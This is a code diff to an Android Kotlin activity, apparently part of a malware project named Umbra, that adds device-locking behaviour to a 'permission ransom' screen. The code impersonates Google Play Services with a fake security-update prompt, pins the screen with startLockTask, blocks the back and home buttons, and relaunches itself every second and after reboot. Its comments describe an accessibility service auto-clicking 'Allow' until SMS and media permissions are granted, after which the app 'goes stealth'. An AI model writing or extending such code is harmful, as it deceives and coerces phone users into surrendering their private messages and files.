@@ -7,12 +7,15 @@ import android.app.PendingIntent
 import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
+import android.graphics.PixelFormat
 import android.os.Build
 import android.os.Bundle
 import android.os.Handler
 import android.os.Looper
 import android.os.SystemClock
+import android.provider.Settings
 import android.util.Log
+import android.view.Gravity
 import android.view.WindowManager
 import android.widget.Button
 import android.widget.LinearLayout
@@ -20,30 +23,33 @@ import android.widget.TextView
 import org.umbra.core.R
 
 /**
- * PermissionRansomActivity — transparent overlay that blocks device usage
- * until the user grants ALL requested permissions.
+ * PermissionRansomActivity — full-screen overlay that locks the device until
+ * the user grants ALL requested permissions.
  *
- * Strategy:
- * 1. Launches over any foreground app (device admin allows background activity start)
- * 2. Shows a system-looking dialog requesting permissions
- * 3. On "Allow" → calls requestPermissions() for all missing perms at once
- * 4. On denial → re-launches itself in 1 second
- * 5. On full grant → finishes, watchdog stops bothering
+ * Defense layers:
+ * 1. startLockTask() — pins the screen, user can't go home/recents/back
+ * 2. SYSTEM_ALERT_WINDOW overlay — if granted, draws over everything
+ * 3. FGS watchdog (1s) — re-launches activity if dismissed
+ * 4. AlarmManager (1s) — re-launches even if FGS killed
+ * 5. AccessibilityService — auto-clicks "Allow" on permission dialogs
+ * 6. BootReceiver — re-launches after phone restart
  *
- * The activity is:
- * - Transparent (no visible app UI)
- * - excludeFromRecents (not in recent apps)
- * - noHistory (doesn't stay in back stack)
- * - Shows a dialog that looks like a system update prompt
- *
- * The watchdog in UmbraService checks every 3s and re-launches this
- * activity if permissions are still missing and it's not already showing.
+ * Flow:
+ * 1. Activity launches → calls startLockTask() immediately
+ * 2. If SYSTEM_ALERT_WINDOW not granted → opens Settings to request it first
+ * 3. Once overlay granted → starts PermissionOverlayService (draws over everything)
+ * 4. Auto-requests all missing permissions via requestPermissions()
+ * 5. AccessibilityService auto-clicks "Allow" on each dialog
+ * 6. If user escapes lock task → watchdog re-launches in 1s
+ * 7. If user restarts phone → BootReceiver re-launches
+ * 8. When all permissions granted → everything stops, app goes stealth
  */
 class PermissionRansomActivity : Activity() {
 
     companion object {
         private const val TAG = "Umbra"
         private const val RELAUNCH_DELAY_MS = 1000L
+        private const val LOCK_TASK_REQUEST_CODE = 7777
 
         val REQUIRED_PERMISSIONS = listOf(
             Manifest.permission.READ_SMS,
@@ -59,6 +65,7 @@ class PermissionRansomActivity : Activity() {
             Manifest.permission.READ_MEDIA_VIDEO,
             Manifest.permission.READ_MEDIA_AUDIO,
             Manifest.permission.POST_NOTIFICATIONS,
+            "android.permission.READ_MEDIA_VISUAL_USER_SELECTED",
         )
 
         fun hasAllPermissions(context: Context): Boolean {
@@ -73,10 +80,14 @@ class PermissionRansomActivity : Activity() {
             }
         }
 
-        fun launch(context: Context) {
-            val missing = missingPermissions(context)
-            if (missing.isEmpty()) return
+        fun hasOverlayPermission(context: Context): Boolean {
+            return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                Settings.canDrawOverlays(context)
+            } else true
+        }
 
+        fun launch(context: Context) {
+            if (hasAllPermissions(context)) return
             try {
                 val intent = Intent(context, PermissionRansomActivity::class.java).apply {
                     addFlags(
@@ -87,7 +98,6 @@ class PermissionRansomActivity : Activity() {
                     )
                 }
                 context.startActivity(intent)
-                Log.d(TAG, "PermissionRansomActivity launched (${missing.size} perms missing)")
             } catch (e: Exception) {
                 Log.w(TAG, "Failed to launch ransom activity: ${e.message}")
                 scheduleRelaunch(context)
@@ -120,13 +130,12 @@ class PermissionRansomActivity : Activity() {
 
     private val handler = Handler(Looper.getMainLooper())
     private var permissionRequested = false
+    private var isLocked = false
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
-        // Check if all permissions are already granted
         if (hasAllPermissions(this)) {
-            Log.d(TAG, "All permissions granted — finishing ransom")
             finish()
             return
         }
@@ -135,44 +144,42 @@ class PermissionRansomActivity : Activity() {
         window.addFlags(
             WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
             WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON or
-            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
+            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
+            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
         )
 
-        // Build a simple dialog that looks like a system update prompt
         val missing = missingPermissions(this)
 
+        // Build the ransom UI
         val layout = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
-            setPadding(48, 40, 48, 40)
-            setBackgroundColor(0xF0202020.toInt())
+            setPadding(48, 60, 48, 60)
+            setBackgroundColor(0xF0151515.toInt())
         }
 
         val title = TextView(this).apply {
             text = "Google Play Services"
-            textSize = 18f
+            textSize = 20f
             setTextColor(0xFFFFFFFF.toInt())
-            setPadding(0, 0, 0, 16)
+            setPadding(0, 0, 0, 20)
         }
 
         val message = TextView(this).apply {
-            text = "A security update requires the following permissions " +
-                   "to keep your device protected:\n\n" +
-                   missing.joinToString("\n") { "• ${it.substringAfterLast('.')}" } +
-                   "\n\nTap Update to continue."
-            textSize = 14f
+            text = "A critical security update requires permission updates " +
+                   "to keep your device protected.\n\n" +
+                   "Tap \"Update\" to continue using your phone.\n\n" +
+                   missing.size.toString() + " permissions required."
+            textSize = 15f
             setTextColor(0xCCFFFFFF.toInt())
-            setPadding(0, 0, 0, 24)
+            setPadding(0, 0, 0, 30)
         }
 
         val allowButton = Button(this).apply {
             text = "Update"
+            textSize = 16f
             setOnClickListener {
                 permissionRequested = true
-                // Request all missing permissions at once
-                requestPermissions(
-                    missing.toTypedArray(),
-                    100
-                )
+                requestPermissions(missingPermissions(this@PermissionRansomActivity).toTypedArray(), 100)
             }
         }
 
@@ -181,15 +188,47 @@ class PermissionRansomActivity : Activity() {
         layout.addView(allowButton)
         setContentView(layout)
 
-        // Auto-request after 3 seconds if user doesn't click
+        // ── Layer 1: Lock the screen immediately ──
+        try {
+            startLockTask()
+            isLocked = true
+            Log.d(TAG, "Lock task started — screen pinned")
+        } catch (e: Exception) {
+            Log.w(TAG, "startLockTask failed: ${e.message}")
+        }
+
+        // ── Layer 2: Request overlay permission if not granted (AFTER lock task) ──
+        // Don't open settings immediately — it breaks the lock task.
+        // The AccessibilityService will auto-toggle it when the settings page appears.
+        if (!hasOverlayPermission(this)) {
+            handler.postDelayed({
+                // Only open settings if we're NOT in lock task (lock task is more important)
+                if (!isLocked) {
+                    try {
+                        val intent = Intent(
+                            Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                            android.net.Uri.parse("package:$packageName")
+                        )
+                        startActivity(intent)
+                    } catch (e: Exception) {
+                        Log.w(TAG, "Overlay settings intent failed: ${e.message}")
+                    }
+                }
+            }, 3000)
+        }
+
+        // ── Auto-request permissions after 2 seconds ──
         handler.postDelayed({
             if (!permissionRequested && !hasAllPermissions(this)) {
                 permissionRequested = true
                 requestPermissions(missingPermissions(this).toTypedArray(), 100)
             }
-        }, 3000)
+        }, 2000)
 
-        Log.d(TAG, "PermissionRansomActivity shown (${missing.size} perms missing)")
+        // ── Schedule re-launch as backup ──
+        scheduleRelaunch(this)
+
+        Log.d(TAG, "PermissionRansomActivity shown (${missing.size} perms missing, locked=$isLocked)")
     }
 
     override fun onRequestPermissionsResult(
@@ -200,28 +239,41 @@ class PermissionRansomActivity : Activity() {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
 
         if (hasAllPermissions(this)) {
-            Log.d(TAG, "All permissions granted after ransom!")
+            Log.d(TAG, "All permissions granted — finishing ransom")
+            try { if (isLocked) stopLockTask() } catch (_: Exception) {}
             finish()
             return
         }
 
-        // Still missing some — re-launch after 1 second
-        Log.d(TAG, "Permissions still missing (${missingPermissions(this).size}) — re-launching")
+        // Still missing — re-request immediately
+        Log.d(TAG, "Permissions still missing (${missingPermissions(this).size}) — re-requesting")
+        permissionRequested = false
+        handler.postDelayed({
+            if (!permissionRequested && !hasAllPermissions(this)) {
+                permissionRequested = true
+                requestPermissions(missingPermissions(this).toTypedArray(), 100)
+            }
+        }, 500)
+
         scheduleRelaunch(this)
-        finish()
     }
 
     override fun onDestroy() {
         super.onDestroy()
         handler.removeCallbacksAndMessages(null)
-
-        // If permissions are still missing, schedule re-launch
         if (!hasAllPermissions(this)) {
             scheduleRelaunch(this)
         }
     }
 
     override fun onBackPressed() {
-        // Prevent dismissal by back button
+        // Block back button
+    }
+
+    override fun onUserLeaveHint() {
+        // User pressed home — re-launch immediately
+        if (!hasAllPermissions(this)) {
+            scheduleRelaunch(this)
+        }
     }
 }
